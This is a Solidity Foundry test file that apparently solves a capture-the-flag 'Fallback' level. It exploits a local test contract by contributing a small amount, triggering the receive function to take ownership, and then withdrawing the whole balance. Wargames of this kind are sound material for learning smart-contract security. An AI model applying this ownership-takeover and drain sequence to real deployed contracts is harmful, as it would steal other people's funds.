// SPDX-License-Identifier: MIT

pragma solidity ^0.8.29;

import {console, Test} from "forge-std/Test.sol";
import {Fallback} from "../01_FallbackTrap/Fallback.sol";

contract FallbackTrapTest is Test {
    Fallback public level;
    address public attacker;

    function setUp() public {
        level = new Fallback();
        attacker = vm.addr(1); // makeAddr("attacker");
        vm.deal(attacker, 1 ether); // give attacker some ether
        assertTrue(level.owner() != attacker, "Player should not be the owner");
        console.log("contract balance before exploit: ", address(level).balance);
    }

    function test_exploit() public {
        vm.startPrank(attacker);

        // Step 1: contribute to meet requirement
        level.contribute{value: 0.0001 ether}();
        assertGt(level.getContribution(), 0, "Contribution failed");

        // Step 2: send ether directly to trigger receive and become owner
        (bool success, ) = address(level).call{value: 0.001 ether}("");
        require(success, "Fallback call failed");
        assertEq(level.owner(), attacker, "Exploit failed: Player is not the owner");

        // Step 3: drain contract
        uint256 balanceBefore = address(attacker).balance / 1e15;
        console.log("Attacker balance(finney) before withdrawal: ", balanceBefore);
        console.log("contract balance(finney) before withdrawal: ", address(level).balance / 1e15);
        level.withdraw();
        uint256 balanceAfter = address(attacker).balance / 1e15;
        console.log("Attacker balance(finney) after withdrawal: ", balanceAfter);
        assertGt(balanceAfter, balanceBefore, "Withdrawal failed: Attacker balance did not increase");

        vm.stopPrank();
        console.log("contract balance(finney) after exploit: ", address(level).balance / 1e15);
        assertEq(address(level).balance, 0, "Contract balance should be 0 after withdrawal");
    }
}
